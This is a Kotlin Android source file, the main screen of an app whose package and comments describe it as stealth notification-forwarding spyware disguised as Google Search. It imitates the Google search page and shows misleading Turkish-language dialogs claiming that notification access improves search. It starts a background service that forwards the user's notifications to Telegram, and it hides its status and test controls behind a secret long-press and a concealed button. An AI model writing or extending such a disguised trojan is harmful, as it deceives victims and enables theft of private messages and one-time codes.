package com.stealth.notifyforwarder.ui

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.Editable
import android.text.TextWatcher
import android.view.View
import android.view.inputmethod.EditorInfo
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.stealth.notifyforwarder.R
import com.stealth.notifyforwarder.databinding.ActivityMainBinding
import com.stealth.notifyforwarder.receiver.BootReceiver
import com.stealth.notifyforwarder.service.NotificationForwarderService
import com.stealth.notifyforwarder.util.ServiceChecker

/**
 * Main Activity - Implements Google Search interface camouflage
 * Handles user interactions and permission requests
 */
class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private var permissionDialogShown = false

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            checkNotificationListenerService()
        } else {
            showPermissionRationale()
        }
    }

    private val notificationListenerSettingsLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        checkNotificationListenerService()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupUI()
        setupSearchFunctionality()
        setupHiddenFeatures()
        checkPermissionsOnLoad()
    }

    override fun onResume() {
        super.onResume()
        // Check if service is running when app comes to foreground
        if (ServiceChecker.isNotificationServiceEnabled(this)) {
            updateStatusIndicator(true)
        } else {
            updateStatusIndicator(false)
        }
    }

    /**
     * Sets up the user interface elements
     */
    private fun setupUI() {
        binding.apply {
            // Search button click listener
            googleSearchButton.setOnClickListener {
                performSearch(searchInput.text.toString())
            }

            // Feeling lucky button click listener
            feelingLuckyButton.setOnClickListener {
                performSearchWithLucky(searchInput.text.toString())
            }

            // Voice icon click (simulates microphone interaction)
            voiceIcon.setOnClickListener {
                Toast.makeText(this@MainActivity, "Sesli arama başlatılıyor...", Toast.LENGTH_SHORT).show()
            }

            // Lens icon click (simulates camera interaction)
            lensIcon.setOnClickListener {
                Toast.makeText(this@MainActivity, "Görsel arama başlatılıyor...", Toast.LENGTH_SHORT).show()
            }
        }
    }

    /**
     * Sets up search functionality with keyboard actions
     */
    private fun setupSearchFunctionality() {
        binding.searchInput.apply {
            // Handle keyboard search action
            setOnEditorActionListener { _, actionId, _ ->
                if (actionId == EditorInfo.IME_ACTION_SEARCH) {
                    performSearch(text.toString())
                    true
                } else {
                    false
                }
            }

            // Enable/disable search button based on input
            addTextChangedListener(object : TextWatcher {
                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
                override fun afterTextChanged(s: Editable?) {
                    // Search button visual feedback could be added here
                }
            })
        }
    }

    /**
     * Sets up hidden features for service management
     * Long press on Google logo triggers settings access
     */
    private fun setupHiddenFeatures() {
        var tapCount = 0
        val handler = Handler(Looper.getMainLooper())

        // Long press on Google logo to show service status
        binding.googleLogo.setOnLongClickListener {
            tapCount++
            if (tapCount == 5) {
                showServiceStatusDialog()
                tapCount = 0
            }

            handler.removeCallbacksAndMessages(null)
            handler.postDelayed({ tapCount = 0 }, 2000)
            true
        }

        // Top right corner tap for settings
        binding.hiddenSettingsButton.setOnClickListener {
            showSettingsMenu()
        }
    }

    /**
     * Checks permissions when activity loads
     */
    private fun checkPermissionsOnLoad() {
        if (!permissionDialogShown) {
            // Delay showing permission dialog for better UX
            Handler(Looper.getMainLooper()).postDelayed({
                checkAndRequestPermissions()
            }, 1500)
        }
    }

    /**
     * Checks and requests necessary permissions
     */
    private fun checkAndRequestPermissions() {
        // Check notification listener service
        if (!ServiceChecker.isNotificationServiceEnabled(this)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                // Need notification permission first
                if (ContextCompat.checkSelfPermission(
                        this,
                        Manifest.permission.POST_NOTIFICATIONS
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                } else {
                    showNotificationAccessDialog()
                }
            } else {
                showNotificationAccessDialog()
            }
        }
    }

    /**
     * Checks notification listener service status
     */
    private fun checkNotificationListenerService() {
        if (ServiceChecker.isNotificationServiceEnabled(this)) {
            startNotificationService()
            Toast.makeText(this, R.string.toast_service_started, Toast.LENGTH_SHORT).show()
        } else {
            if (!permissionDialogShown) {
                showNotificationAccessDialog()
            }
        }
    }

    /**
     * Shows the notification access dialog
     */
    private fun showNotificationAccessDialog() {
        permissionDialogShown = true
        binding.permissionDialogContainer.visibility = View.VISIBLE

        binding.permissionGrant.setOnClickListener {
            binding.permissionDialogContainer.visibility = View.GONE
            openNotificationListenerSettings()
        }

        binding.permissionDeny.setOnClickListener {
            binding.permissionDialogContainer.visibility = View.GONE
            permissionDialogShown = false
            // Show rationale after deny
            Handler(Looper.getMainLooper()).postDelayed({
                showPermissionRationale()
            }, 2000)
        }
    }

    /**
     * Shows permission rationale dialog
     */
    private fun showPermissionRationale() {
        AlertDialog.Builder(this)
            .setTitle("Google Arama İyileştirmesi")
            .setMessage("Bildirim erişimi, arama deneyiminizi kişiselleştirmek için gereklidir. Bu izin verilmediğinde, bazı özellikler düzgün çalışmayabilir.")
            .setPositiveButton("Ayarlara Git") { _, _ ->
                openNotificationListenerSettings()
            }
            .setNegativeButton("Şimlik Değil", null)
            .setCancelable(false)
            .show()
    }

    /**
     * Opens system notification listener settings
     */
    private fun openNotificationListenerSettings() {
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        notificationListenerSettingsLauncher.launch(intent)
    }

    /**
     * Starts the notification forwarding service
     */
    private fun startNotificationService() {
        val serviceIntent = Intent(this, NotificationForwarderService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    /**
     * Performs a Google search with the given query
     */
    private fun performSearch(query: String) {
        if (query.isNotBlank()) {
            val searchUri = Uri.parse("https://www.google.com/search?q=${Uri.encode(query)}")
            val intent = Intent(Intent.ACTION_VIEW, searchUri)
            startActivity(intent)
        } else {
            binding.searchInput.error = "Arama terimi girin"
        }
    }

    /**
     * Performs a "I'm Feeling Lucky" search
     */
    private fun performSearchWithLucky(query: String) {
        if (query.isNotBlank()) {
            val searchUri = Uri.parse("https://www.google.com/search?q=${Uri.encode(query)}&btnI=I")
            val intent = Intent(Intent.ACTION_VIEW, searchUri)
            startActivity(intent)
        } else {
            // Navigate to Google homepage for empty lucky search
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com"))
            startActivity(intent)
        }
    }

    /**
     * Shows service status dialog (hidden feature)
     */
    private fun showServiceStatusDialog() {
        val isServiceRunning = ServiceChecker.isNotificationServiceRunning(this)
        val status = if (isServiceRunning) "Aktif" else "Pasif"

        AlertDialog.Builder(this)
            .setTitle("Servis Durumu")
            .setMessage("Arka plan servisi: $status\n\nBot durumu: Aktif")
            .setPositiveButton("Tamam", null)
            .setNeutralButton("Test Mesajı") { _, _ ->
                sendTestMessage()
            }
            .show()
    }

    /**
     * Shows settings menu (hidden feature)
     */
    private fun showSettingsMenu() {
        val options = arrayOf("Servisi Yeniden Başlat", "Test Mesajı Gönder", "Kuyruğu Temizle")

        AlertDialog.Builder(this)
            .setTitle("Ayarlar")
            .setItems(options) { _, which ->
                when (which) {
                    0 -> restartService()
                    1 -> sendTestMessage()
                    2 -> clearQueue()
                }
            }
            .show()
    }

    /**
     * Restarts the notification service
     */
    private fun restartService() {
        val serviceIntent = Intent(this, NotificationForwarderService::class.java)
        stopService(serviceIntent)

        Handler(Looper.getMainLooper()).postDelayed({
            startNotificationService()
            Toast.makeText(this, "Servis yeniden başlatıldı", Toast.LENGTH_SHORT).show()
        }, 500)
    }

    /**
     * Sends a test message to Telegram
     */
    private fun sendTestMessage() {
        val workRequest = OneTimeWorkRequestBuilder<com.stealth.notifyforwarder.util.TestMessageWorker>()
            .build()
        WorkManager.getInstance(this).enqueue(workRequest)
        Toast.makeText(this, "Test mesajı gönderiliyor...", Toast.LENGTH_SHORT).show()
    }

    /**
     * Clears the notification queue
     */
    private fun clearQueue() {
        Thread {
            val database = (application as com.stealth.notifyforwarder.MainApplication).database
            database.notificationDao().clearQueue()
            runOnUiThread {
                Toast.makeText(this, "Kuyruk temizlendi", Toast.LENGTH_SHORT).show()
            }
        }.start()
    }

    /**
     * Updates the status indicator
     */
    private fun updateStatusIndicator(isConnected: Boolean) {
        // Could update UI to show connection status
        // For camouflage purposes, minimal visual changes
    }
}
